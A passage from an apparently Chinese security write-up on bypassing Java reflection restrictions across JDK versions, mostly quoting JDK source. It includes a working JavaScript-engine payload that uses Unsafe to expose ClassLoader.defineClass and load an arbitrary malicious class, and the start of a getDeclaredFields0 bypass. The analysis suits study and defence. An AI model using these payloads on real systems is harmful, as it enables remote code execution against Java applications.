      <p>上述条件中最后一个条件的可操作空间还是很大的，很多看似不合理的反射（比如前面实例化 <code>Runtime</code>）都是在这个判断中被允许的，但是会调用 <code>logIfOpenedForIllegalAccess</code> 输出警告信息。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果被反射类的包是对调用者开放的，返回 true</span></span><br><span class="line"><span class="keyword">if</span> (declaringModule.isOpen(pn, callerModule)) &#123;</span><br><span class="line">    logIfOpenedForIllegalAccess(caller, declaringClass);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>高版本 GDK 进一步加强了对反射的限制，也是在这个条件上加强的。</p>

    </div>
  </div>

<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>在分析出过滤条件之后，我们只需要设法满足上述条件即可绕过。通常来说我们都是通过修改被反射对象来满足 <code>checkCanSetAccessible</code> 的条件。</p>
<p>还是以  JS 引擎动态加载字节码为例，这一过程中被反射类 <code>ClassLoader</code> 的访问属性 <code>public</code>，但是 <code>defineClass</code> 方法为私有方法因此不满足条件。</p>
<p>我们可以通过反射修改 <code>defineClass</code> 方法对应 <code>Method</code> 的 <code>modifiers</code> 属性使得  <code>defineClass</code> 方法的访问修饰符为 <code>public</code> 来实现绕过。修改 <code>modifiers</code> 的过程既可以在 Java 代码中也可以在 JS 代码中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getJsPayload</span><span class="params">(String code)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;var data = &#x27;&quot;</span> + code + <span class="string">&quot;&#x27;;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var bytes = java.util.Base64.getDecoder().decode(data);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var Unsafe = Java.type(\&quot;sun.misc.Unsafe\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var field = Unsafe.class.getDeclaredField(\&quot;theUnsafe\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;field.setAccessible(true);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var unsafe = field.get(null);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var Modifier = Java.type(\&quot;java.lang.reflect.Modifier\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var byteArray = Java.type(\&quot;byte[]\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var int = Java.type(\&quot;int\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\&quot;defineClass\&quot;,byteArray.class,int.class,int.class);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var modifiers = defineClassMethod.getClass().getDeclaredField(\&quot;modifiers\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;unsafe.putShort(defineClassMethod, unsafe.objectFieldOffset(modifiers), Modifier.PUBLIC);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var cc = defineClassMethod.invoke(&quot;</span> +</span><br><span class="line">            <span class="string">&quot;java.lang.Thread.currentThread().getContextClassLoader(),bytes,0,bytes.length);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;cc.newInstance();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line">manager.getEngineByName(<span class="string">&quot;js&quot;</span>).eval(getJsPayload(Base64.getEncoder().encodeToString(getEvilClass(<span class="string">&quot;calc&quot;</span>))));</span><br></pre></td></tr></table></figure></div>

<h3 id="12≤JDK"><a href="#12≤JDK" class="headerlink" title="12≤JDK&lt;17"></a>12≤JDK&lt;17</h3><p>JDK12 起针对 <code>getDeclaredField</code> 的限制增多，一些字段对应的 <code>Field</code> 对象无法获取。</p>
<h4 id="限制条件分析-1"><a href="#限制条件分析-1" class="headerlink" title="限制条件分析"></a>限制条件分析</h4><p><code>jdk.internal.reflect.Reflection</code> 中的 <code>fieldFilterMap</code> 用于存储需要被过滤的 <code>Field</code>，所有添加到这个 Map 的字段都不能通过反射获取。</p>
<p>在 JDK11 中，这个字段仅对很少一部分类的个别字段做了限制：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 反射工具类，提供了 java.lang 和 java.lang.reflect 中使用的公共工具方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 用于过滤某些类中的字段和方法，避免它们被公共访问。</span></span><br><span class="line"><span class="comment">     * 这些字段和方法可能是敏感的，或者包含 VM 内部对象。</span></span><br><span class="line"><span class="comment">     * 这些 Map 很少更新。为了避免每次访问都进行同步，我们使用写时复制（copy-on-write）机制。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Map&lt;Class&lt;?&gt;, String[]&gt; fieldFilterMap;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Map&lt;Class&lt;?&gt;, String[]&gt; methodFilterMap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态代码块，初始化字段和方法的过滤 Map</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个 HashMap，用于存储类及其字段的过滤规则</span></span><br><span class="line">        Map&lt;Class&lt;?&gt;, String[]&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Class&lt;?&gt;, String[]&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 为 Reflection 类指定字段过滤规则，禁止访问 fieldFilterMap 和 methodFilterMap 字段</span></span><br><span class="line">        map.put(Reflection.class, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;fieldFilterMap&quot;</span>, <span class="string">&quot;methodFilterMap&quot;</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 为 System 类指定字段过滤规则，禁止访问 &quot;security&quot; 字段</span></span><br><span class="line">        map.put(System.class, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;security&quot;</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 为 Class 类指定字段过滤规则，禁止访问 &quot;classLoader&quot; 字段</span></span><br><span class="line">        map.put(Class.class, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;classLoader&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将过滤规则应用到 fieldFilterMap</span></span><br><span class="line">        fieldFilterMap = map;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化方法过滤 Map，目前没有设置任何方法的过滤规则</span></span><br><span class="line">        methodFilterMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>但在 JDK12 中，限制变多了，其中 <code>Field</code> 的所有成员成员都被限制为不可通过反射获取。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 反射工具类，提供了 java.lang 和 java.lang.reflect 中使用的公共工具方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 用于过滤某些类中的字段和方法，避免它们被公共访问。</span></span><br><span class="line"><span class="comment">     * 这些字段和方法可能是敏感的，或者包含 VM 内部对象。</span></span><br><span class="line"><span class="comment">     * 这些 Map 很少更新。为了避免每次访问都进行同步，我们使用写时复制（copy-on-write）机制。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Map&lt;Class&lt;?&gt;, Set&lt;String&gt;&gt; fieldFilterMap;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Map&lt;Class&lt;?&gt;, Set&lt;String&gt;&gt; methodFilterMap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通配符字符串，用于表示所有成员</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">WILDCARD</span> <span class="operator">=</span> <span class="string">&quot;*&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有成员的集合，包含一个通配符</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Set&lt;String&gt; ALL_MEMBERS = Set.of(WILDCARD);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态代码块，初始化字段和方法的过滤 Map</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化字段过滤 Map</span></span><br><span class="line">        fieldFilterMap = Map.of(</span><br><span class="line">            Reflection.class, ALL_MEMBERS,           <span class="comment">// Reflection 类的所有成员</span></span><br><span class="line">            AccessibleObject.class, ALL_MEMBERS,    <span class="comment">// AccessibleObject 类的所有成员</span></span><br><span class="line">            Class.class, Set.of(<span class="string">&quot;classLoader&quot;</span>),     <span class="comment">// Class 类不允许访问 &quot;classLoader&quot; 字段</span></span><br><span class="line">            ClassLoader.class, ALL_MEMBERS,         <span class="comment">// ClassLoader 类的所有成员</span></span><br><span class="line">            Constructor.class, ALL_MEMBERS,         <span class="comment">// Constructor 类的所有成员</span></span><br><span class="line">            Field.class, ALL_MEMBERS,               <span class="comment">// Field 类的所有成员</span></span><br><span class="line">            Method.class, ALL_MEMBERS,              <span class="comment">// Method 类的所有成员</span></span><br><span class="line">            Module.class, ALL_MEMBERS,              <span class="comment">// Module 类的所有成员</span></span><br><span class="line">            System.class, Set.of(<span class="string">&quot;security&quot;</span>)        <span class="comment">// System 类不允许访问 &quot;security&quot; 字段</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化方法过滤 Map，当前没有任何方法过滤</span></span><br><span class="line">        methodFilterMap = Map.of();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>这部分修改对应的 <a class="link"   target="_blank" rel="noopener" href="https://bugs.openjdk.org/browse/JDK-8210522" >issue<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：</p>
<blockquote>
<p><strong>问题</strong>：<br><code>java.lang.reflect</code> 和 <code>java.lang.invoke</code> 包中的许多类都包含私有字段，如果直接访问这些字段，可能会破坏运行时或导致虚拟机崩溃。理想情况下，<code>java.base</code> 中所有非公共&#x2F;非受保护的字段都应该通过核心反射进行过滤，并且不能通过 <code>Unsafe</code> API 进行读写，但目前我们离这个目标还有很大距离。与此同时，现有的过滤机制暂时充当了一个应急补救措施。</p>
<p><strong>解决方案</strong>：<br>扩展过滤器，涵盖以下类中的所有字段：</p>
<ul>
<li><code>java.lang.ClassLoader</code></li>
<li><code>java.lang.reflect.AccessibleObject</code></li>
<li><code>java.lang.reflect.Constructor</code></li>
<li><code>java.lang.reflect.Field</code></li>
<li><code>java.lang.reflect.Method</code></li>
<li>以及 <code>java.lang.invoke.MethodHandles.Lookup</code> 中用于查找类和访问模式的私有字段。</li>
</ul>
</blockquote>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>其实从上面的分析来看实际上在 JDK12 之前 Java 就对获取字段进行了限制。只不过从 JDK12 开始由于这个限制的加强，导致一些关键操作失败，由此衍生出一些绕过方法。因此这里把 JDK12 作为一个阶段的起点。</p>
<p>例如从 JDK 12 起，在修改 <code>final</code> 类型的变量的过程中，调用 <code>getDeclaredField</code> 函数获取<code>Field</code> 对象的 <code>modifiers</code> 成员时由于 <code>Field</code> 对象的所有成员都被过滤导致无法找到：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.NoSuchFieldException: modifiers</span><br><span class="line">	at java.base/java.lang.Class.getDeclaredField(Class.java:2412)</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p><code>getDeclaredField</code> 函数实际会通过调用 <code>privateGetDeclaredFields</code> 函数来获取字段，在 <code>privateGetDeclaredFields</code> 函数中：</p>
<ul>
<li>首先会调用 <code>getDeclaredFields0</code> 从 JVM 中获取调用 <code>getDeclaredField</code> 的 <code>clazz</code> 所表示的类的所有字段。</li>
<li>之后调用 <code>Reflection.filterFields</code> 函数利用 <code>fieldFilterMap</code> 把这些字段过滤一遍，仅留下允许的字段。</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 私有方法，用于获取类声明的字段数组。</span></span><br><span class="line"><span class="comment"> * 该方法不会直接暴露给外部，而是用于内部调用。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> publicOnly 是否仅返回公共字段</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 字段数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Field[] privateGetDeclaredFields(<span class="type">boolean</span> publicOnly) &#123;</span><br><span class="line">    Field[] res;</span><br><span class="line">    <span class="comment">// 获取类的反射数据</span></span><br><span class="line">    ReflectionData&lt;T&gt; rd = reflectionData();</span><br><span class="line">    <span class="keyword">if</span> (rd != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果缓存中有数据，则直接返回</span></span><br><span class="line">        res = publicOnly ? rd.declaredPublicFields : rd.declaredFields;</span><br><span class="line">        <span class="keyword">if</span> (res != <span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果缓存没有数据，从 VM 获取字段数据</span></span><br><span class="line">    res = Reflection.filterFields(<span class="built_in">this</span>, getDeclaredFields0(publicOnly));</span><br><span class="line">    <span class="comment">// 更新缓存数据</span></span><br><span class="line">    <span class="keyword">if</span> (rd != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (publicOnly) &#123;</span><br><span class="line">            rd.declaredPublicFields = res;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            rd.declaredFields = res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res; <span class="comment">// 返回字段数组</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回指定类的字段对象，表示该类或接口声明的字段。</span></span><br><span class="line"><span class="comment"> * 该方法根据字段名称查找类声明的字段，并返回反射表示的字段对象。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name 字段名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 该类声明的字段对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NoSuchFieldException 如果指定的字段找不到</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException 如果字段名称为 null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException 如果安全管理器阻止访问该字段</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="keyword">public</span> Field <span class="title function_">getDeclaredField</span><span class="params">(String name)</span></span><br><span class="line">    <span class="keyword">throws</span> NoSuchFieldException, SecurityException &#123;</span><br><span class="line">    Objects.requireNonNull(name); <span class="comment">// 确保字段名称不为空</span></span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 安全检查，确保调用者有权限访问该字段</span></span><br><span class="line">        checkMemberAccess(sm, Member.DECLARED, Reflection.getCallerClass(), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 根据字段名称查找字段</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> searchFields(privateGetDeclaredFields(<span class="literal">false</span>), name);</span><br><span class="line">    <span class="keyword">if</span> (field == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果找不到字段，抛出 NoSuchFieldException 异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 复制字段并返回</span></span><br><span class="line">    <span class="keyword">return</span> getReflectionFactory().copyField(field);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>filterFields</code> 函数实际上就是暴力枚举获取到的所有字段 <code>members</code> 以及需要过滤的字段名称 <code>filteredNames</code> 得到过滤后的字段数组。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 过滤给定的成员数组，移除指定名称的成员</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> members 需要过滤的成员数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filteredNames 需要移除的成员名称集合</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 过滤后的成员数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Member[] filter(Member[] members, Set&lt;String&gt; filteredNames) &#123;</span><br><span class="line">    <span class="comment">// 如果过滤的名称集合为空或成员数组为空，则直接返回原数组</span></span><br><span class="line">    <span class="keyword">if</span> ((filteredNames == <span class="literal">null</span>) || (members.length == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> members;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取成员的类型</span></span><br><span class="line">    Class&lt;?&gt; memberType = members[<span class="number">0</span>].getClass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果过滤名称集合中包含通配符，则返回一个空的成员数组</span></span><br><span class="line">    <span class="keyword">if</span> (filteredNames.contains(WILDCARD)) &#123;</span><br><span class="line">        <span class="keyword">return</span> (Member[]) Array.newInstance(memberType, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算需要保留的成员数量</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numNewMembers</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Member member : members) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!filteredNames.contains(member.getName())) &#123;</span><br><span class="line">            ++numNewMembers; <span class="comment">// 如果当前成员的名称不在过滤名单中，计数器加1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建新的成员数组，大小为需要保留的成员数量</span></span><br><span class="line">    Member[] newMembers = (Member[]) Array.newInstance(memberType, numNewMembers);</span><br><span class="line">    <span class="type">int</span> <span class="variable">destIdx</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将未被过滤的成员放入新的数组中</span></span><br><span class="line">    <span class="keyword">for</span> (Member member : members) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!filteredNames.contains(member.getName())) &#123;</span><br><span class="line">            newMembers[destIdx++] = member;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回过滤后的新成员数组</span></span><br><span class="line">    <span class="keyword">return</span> newMembers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 过滤指定类中的字段，排除不允许访问的字段。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> containingClass 字段所属的类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fields 要过滤的字段数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 过滤后的字段数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field[] filterFields(Class&lt;?&gt; containingClass, Field[] fields) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fieldFilterMap == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果字段过滤规则为空，直接返回原字段数组</span></span><br><span class="line">        <span class="keyword">return</span> fields;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 根据字段过滤规则进行过滤</span></span><br><span class="line">    <span class="keyword">return</span> (Field[]) filter(fields, fieldFilterMap.get(containingClass));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h4><h5 id="调用-getDeclaredFields0-函数"><a href="#调用-getDeclaredFields0-函数" class="headerlink" title="调用 getDeclaredFields0 函数"></a>调用 getDeclaredFields0 函数</h5><p>由于过滤是基于 <code>getDeclaredFields0</code> 的结果进行的，而 <code>getDeclaredFields0</code> 本体在反射调用中并不会被限制，因此我们可以通过反射调用 <code>getDeclaredFields0</code> 获取</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> Field[]       getDeclaredFields0(<span class="type">boolean</span> publicOnly);</span><br></pre></td></tr></table></figure></div>

<p>由此实现的 <code>getDeclaredField</code> 函数如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归获取指定类及其父类中的声明字段（包括私有字段）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clazz     目标类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fieldName 需要查找的字段名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 如果找到指定名称的字段，则返回该字段对象；否则返回 null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getDeclaredField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">// 循环遍历当前类及其所有父类</span></span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过反射获取 Class 类的私有方法 getDeclaredFields0</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">getDeclaredFields0</span> <span class="operator">=</span> Class.class.getDeclaredMethod(<span 